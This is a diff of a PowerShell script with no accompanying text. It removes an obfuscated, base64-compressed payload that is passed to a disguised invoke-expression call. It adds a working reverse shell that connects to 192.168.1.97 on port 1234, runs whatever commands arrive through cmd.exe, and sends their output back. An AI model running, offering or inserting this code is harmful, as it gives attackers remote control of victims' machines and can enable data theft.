@@ -1,1 +1,55 @@
- ( nEw-ObJeCT SYSTEM.Io.ComPrEsSiOn.dEFLAtestreAM([SYSTEm.io.mEmOrySTreAM] [CoNVERt]::fRomBASe64StrinG( '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') , [Io.CompResSION.cOMpREsSiONMODE]::DeCOMpREss)| fOReAch { nEw-ObJeCT  SYsTEm.IO.STreAMreaDer($_ , [SystEm.teXT.EncODing]::asCii)}| fOREaCh{ $_.REaDtOEND( )} )|&((GET-variaBle '*MDr*').NAme[3,11,2]-joIn'')
+echo "qwe"
+Set-Variable -Name socket -Value (new-object System.Net.Sockets.TcpClient('192.168.1.97',1234));
+if($socket -eq $null){exit 1}
+Set-Variable -Name stream -Value ($socket.GetStream());
+Set-Variable -Name writer -Value (new-object System.IO.StreamWriter($stream));
+Set-Variable -Name buffer -Value (new-object System.Byte[] 1024);
+Set-Variable -Name encoding -Value (new-object System.Text.AsciiEncoding);
+do
+{
+        $writer.Flush();
+        Set-Variable -Name read -Value ($null);
+        Set-Variable -Name res -Value ("")
+        while($stream.DataAvailable -or $read -eq $null) {
+                Set-Variable -Name read -Value ($stream.Read($buffer, 0, 1024))
+        }
+        Set-Variable -Name out -Value ($encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n",""));
+        if(!$out.equals("exit")){
+                $args = "";
+                if($out.IndexOf(' ') -gt -1){
+                        $args = $out.substring($out.IndexOf(' ')+1);
+                        $out = $out.substring(0,$out.IndexOf(' '));
+                        if($args.split(' ').length -gt 1){
+                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
+                $pinfo.FileName = "cmd.exe"
+                $pinfo.RedirectStandardError = $true
+                $pinfo.RedirectStandardOutput = $true
+                $pinfo.UseShellExecute = $false
+                $pinfo.Arguments = "/c $out $args"
+                $p = New-Object System.Diagnostics.Process
+                $p.StartInfo = $pinfo
+                $p.Start() | Out-Null
+                $p.WaitForExit()
+                $stdout = $p.StandardOutput.ReadToEnd()
+                $stderr = $p.StandardError.ReadToEnd()
+                if ($p.ExitCode -ne 0) {
+                    $res = $stderr
+                } else {
+                    $res = $stdout
+                }
+                        }
+                        else{
+                                $res = (&"$out" "$args") | out-string;
+                        }
+                }
+                else{
+                        $res = (&"$out") | out-string;
+                }
+                if($res -ne $null){
+        $writer.WriteLine($res)
+    }
+        }
+}While (!$out.equals("exit"))
+$writer.close();
+$socket.close();
+$stream.Dispose()
